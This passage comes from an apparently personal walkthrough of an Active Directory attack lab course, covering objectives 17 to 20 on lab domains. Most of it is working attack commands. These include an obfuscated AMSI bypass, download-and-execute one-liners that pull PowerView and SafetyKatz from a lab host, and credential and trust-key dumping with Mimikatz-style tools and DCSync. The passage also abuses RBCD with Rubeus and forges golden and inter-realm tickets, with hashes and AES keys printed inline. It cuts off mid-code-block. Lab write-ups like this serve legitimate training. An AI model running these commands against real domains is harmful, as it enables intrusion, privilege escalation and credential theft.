</span></pre></table></code></div></div><h3 id="learning-objective-17"><span class="mr-2">Learning Objective 17</span><a href="#learning-objective-17" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this objective, we will be finding a computer in the dcorp domain where we have write permissions, then abuse those write permissions to access that computer as DA. We can use PowerView after running invisi-shell to enumerate write permissions for a user that we have compromised. We can try this for multiple users or use bloodhound and we would know that ciadmin has write permissions on the computer object of dcorp-mgmt;</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-InterestingDomainACL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">identityreferencename</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'ciadmin'</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Recall that we compromised ciadmin from dcorp-ci. We can use either the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci. We can use the reverse shell and load powerview on there. Once on the reverse shell as ciadmin on dcorp-ci:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://172.16.100.20/sbloggingbypass.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">

 </span><span class="n">S</span><span class="se">`e</span><span class="nx">T-It</span><span class="se">`e</span><span class="nx">m</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uZ'</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Get-varI</span><span class="se">`A`B</span><span class="nx">LE</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nt">-VaL</span><span class="w">
</span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w"> </span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'
s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">AlteredSecurity</span><span class="w"> </span><span class="nx">Attacking</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">Defending</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">87</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'msi'</span><span class="p">),</span><span class="s1">'d'</span><span class="p">,(</span><span class="s1">'I'</span><span class="o">+</span><span class="s1">'nitF'</span><span class="o">+</span><span class="s1">'aile'</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w">
</span><span class="p">(</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'tat'</span><span class="p">),</span><span class="s1">'i'</span><span class="p">,(</span><span class="s1">'Non'</span><span class="o">+</span><span class="s1">'Publ'</span><span class="o">+</span><span class="s1">'i'</span><span class="p">),</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w">
</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="n">iex</span><span class="w"> </span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://172.16.100.20/PowerView.ps1'</span><span class="p">))</span><span class="w">

</span></pre></table></code></div></div><p>Now, we set RBCD on dcorp-mgmt for the student VMs in the reverse shell as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">Set-DomainRBCD</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nt">-DelegateFrom</span><span class="w"> </span><span class="s1">'dcorp-std520$'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="n">and</span><span class="w"> </span><span class="nx">check</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">it</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">correctly</span><span class="w"> </span><span class="nx">with</span><span class="w">

</span><span class="n">Get-DomainRBCD</span><span class="w">

</span><span class="n">which</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">spit</span><span class="w"> </span><span class="nx">out</span><span class="w"> </span><span class="nx">some</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">showing</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">sourcename</span><span class="w"> </span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">delegatedname</span><span class="w"> </span><span class="nx">dcorp-std520</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><p>from the student VM in an elevated shell, we will get the AES keys using loader.exe to load safetykatz and execute it in memory, then grab the aes256 hmac</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"sekurlsa::ekeys"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Then, we can use Rubeus to abuse RBCD to access dcorp-mgmt as DA</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:dcorp-std520</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:04ec575508fbff957465d31785a6de50d7b3e24a808dc65365f81323d23a11e0</span><span class="w"> </span><span class="nx">/msdsspn:http/dcorp-mgmt</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then check if we can access dcorp-mgmt with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">whoami</span><span class="w">
</span><span class="nx">hostname</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-18"><span class="mr-2">Learning Objective 18</span><a href="#learning-objective-18" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using DA access to dollarcorp.moneycorp.local, escalate privileges to EA or DA to the parent domain, moneycorp.local using the domain trust key. We can retreive the trust key between dollarcorp and moneycorp using mimikatz or safetykatz. Start a process with DA privileges by running the below command from an elevated prompt:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then use the below commands from the process running as DA to copy loader.exe on dcorp-dc and use it to extract credentials</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorp-dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">

</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">20</span><span class="w">

</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">

</span><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></pre></table></code></div></div><p>In this case the aes256 hmac for the dollarcorp.moneycorp.local to moneycorp.local trust is 556d040b71b7fc20aa043027b19a3dafc6dbffdb7968966e66200c3f5683e56a and the rc4 is f7277dcaf640d00ddd2744143b346c36</p><p>We will use it to forge a ticket with the SID history of EA admins by running the below command from an elevated command prompt on the student VM</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4: f7277dcaf640d00ddd2744143b346c36 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">

</span><span class="kr">if</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">good</span><span class="p">,</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">see</span><span class="w"> </span><span class="s2">"Final ticket saved to file !"</span><span class="w">
</span></pre></table></code></div></div><p>We can use rubeus to use this ticket as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\AD\Tools\trust_tkt.kirbi</span><span class="w"> </span><span class="nx">/service:cifs/mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/dc:mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then check if we can access the file system on mcorp-dc as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">\\mcorp-dc.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h4 id="using-invoke-mimi-and-old-kekeo"><span class="mr-2">Using Invoke-Mimi and Old Kekeo</span><a href="#using-invoke-mimi-and-old-kekeo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>starting with the DA process</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">

</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\AD\Tools\</span><span class="w">

</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w">

</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">S</span><span class="se">`e</span><span class="nx">TIt</span><span class="se">`e</span><span class="nx">m</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uZ'</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w">
</span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Get-varI</span><span class="se">`A`B</span><span class="nx">LE</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">VaL</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w"> </span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'
s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'msi'</span><span class="p">),</span><span class="s1">'d'</span><span class="p">,(</span><span class="s1">'I'</span><span class="o">+</span><span class="s1">'nitF'</span><span class="o">+</span><span class="s1">'aile'</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w">
</span><span class="p">(</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'tat'</span><span class="p">),</span><span class="s1">'i'</span><span class="p">,(</span><span class="s1">'Non'</span><span class="o">+</span><span class="s1">'Publ'</span><span class="o">+</span><span class="s1">'i'</span><span class="p">),</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w">
</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="kr">exit</span><span class="w">

</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::trust /patch"'</span><span class="w">
</span></pre></table></code></div></div><p>Then create the inter-realm TGT by running the below command on your machine using the rc4_hmac_nt of dollarcorp.moneycorp.local -&gt; moneycorp.local</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:132f54e05f7c3db02e97c00ff3879067 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust2_tkt.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><p>Then, create a TGS for a service in the parent domain (asktgs is in \AD\Tools\kekeo_old)</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\AD\Tools\kekeo_old\trust2_tkt.kirbi</span><span class="w"> </span><span class="nx">CIFS/mcorp-dc.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><p>Present the TGS to the target service</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="o">.</span><span class="nx">\CIFS.mcorp-dc.moneycorp.local.kirbi</span><span class="w">
</span></pre></table></code></div></div><p>Now try to access the target service, a success means escalation to the parent DA</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\mcorp-dc.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-19"><span class="mr-2">Learning Objective 19</span><a href="#learning-objective-19" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using DA access to dollarcorp.moneycorp.local, escalate privileges to EA or DA to the parent domain, moneycorp.local using dollarcorps krbtgt hash. Let’s create the inter-realm TGT and inject it by running the below command from an elevated command prompt:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Then check if we can access moneycorp DC</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">\\mcorp-dc.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><p>If we get output, all is good. Let’s run DCSync attack against mcorp-dc to extract it’s secrets:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-20"><span class="mr-2">Learning Objective 20</span><a href="#learning-objective-20" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest. We need the trust key for the trust between dollarcorp and eurocorp, which we can get with mimikatz or safetykatz. Start a process with DA privileges with Rubeus:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><h4 id="using-safetykatzexe-1"><span class="mr-2">Using SafetyKatz.exe</span><a href="#using-safetykatzexe-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Run the below commands from the process running as DA to copy loader.exe to dcorp-dc and use it to extract the trust key</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
